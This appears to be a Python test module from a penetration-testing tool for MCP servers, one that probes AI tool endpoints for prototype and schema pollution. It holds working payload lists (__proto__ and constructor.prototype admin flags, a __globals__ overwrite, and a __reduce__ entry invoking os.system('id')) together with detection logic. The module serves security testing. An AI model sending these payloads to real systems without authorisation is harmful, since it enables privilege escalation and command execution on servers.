"""Schema/prototype pollution attacks via MCP tools"""
import json


class SchemaPollutionTest:
    """Test for prototype/schema pollution vulnerabilities"""
    
    def __init__(self, pentester):
        self.pentester = pentester
    
    # JavaScript prototype pollution
    PROTO_PAYLOADS = [
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"shell": "/bin/sh", "env": {"PATH": "/tmp"}}},
    ]
    
    # Python class pollution
    PYTHON_PAYLOADS = [
        {"__class__": {"__init__": {"__globals__": {"admin": True}}}},
        {"__reduce__": ["os.system", ["id"]]},
        {"__dict__": {"_admin": True}},
    ]
    
    # Generic injection into nested structures
    NESTED_PAYLOADS = [
        {"a": {"b": {"c": {"__proto__": {"x": 1}}}}},
        {"config": {"__proto__": {"debug": True}}},
        {"settings": {"constructor": {"prototype": {"shell": True}}}},
    ]
    
    def run(self, tool):
        """Test for schema pollution vulnerabilities"""
        self.pentester.health_check()
        findings = []
        schema = tool.get('inputSchema', {})
        
        # Find object-type arguments
        for arg, spec in schema.get('properties', {}).items():
            if spec.get('type') in ['object', None]:  # None = any type
                findings.extend(self._test_pollution(tool, arg))
        
        # Also test with entire arguments as pollution payload
        findings.extend(self._test_root_pollution(tool))
        
        return findings
    
    def _test_pollution(self, tool, arg):
        findings = []
        all_payloads = self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS + self.NESTED_PAYLOADS
        
        for payload in all_payloads:
            try:
                params = {"name": tool['name'], "arguments": {arg: payload}}
                resp, _ = self.pentester.send("tools/call", params)
                
                # Check for pollution indicators
                content = str(resp)
                if self._detect_pollution(content, payload):
                    findings.append({
                        'type': 'SCHEMA_POLLUTION',
                        'tool': tool['name'],
                        'arg': arg,
                        'payload': json.dumps(payload),
                        'severity': 'HIGH',
                        'note': 'Potential prototype/schema pollution detected'
                    })
            except (RuntimeError, IOError, OSError, KeyError) as e:
                print(f"[!] Schema pollution test error for {tool['name']}.{arg}: {e}")
        
        return findings
    
    def _test_root_pollution(self, tool):
        """Test pollution at root arguments level"""
        findings = []
        all_payloads = self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS
        
        for payload in all_payloads:
            try:
                params = {"name": tool['name'], "arguments": payload}
                resp, _ = self.pentester.send("tools/call", params)
                
                content = str(resp)
                if self._detect_pollution(content, payload):
                    findings.append({
                        'type': 'ROOT_POLLUTION',
                        'tool': tool['name'],
                        'payload': json.dumps(payload),
                        'severity': 'CRITICAL',
                        'note': 'Root-level pollution successful'
                    })
            except (RuntimeError, IOError, OSError, KeyError) as e:
                print(f"[!] Root pollution test error for {tool['name']}: {e}")
        
        return findings
    
    def _detect_pollution(self, content, payload):
        """Detect pollution via response analysis"""
        # Check for RCE indicators (from Python payloads)
        if self.pentester.detector.findings:
            return True
        
        # Check for error messages indicating pollution attempt was processed
        pollution_indicators = [
            '__proto__',
            'prototype',
            '__class__',
            '__init__',
            '__globals__',
            'constructor',
            'Object.prototype',
        ]
        
        # Look for reflection of pollution keys in response
        for key in pollution_indicators:
            if key in str(payload) and key in content:
                return True
        
        return False
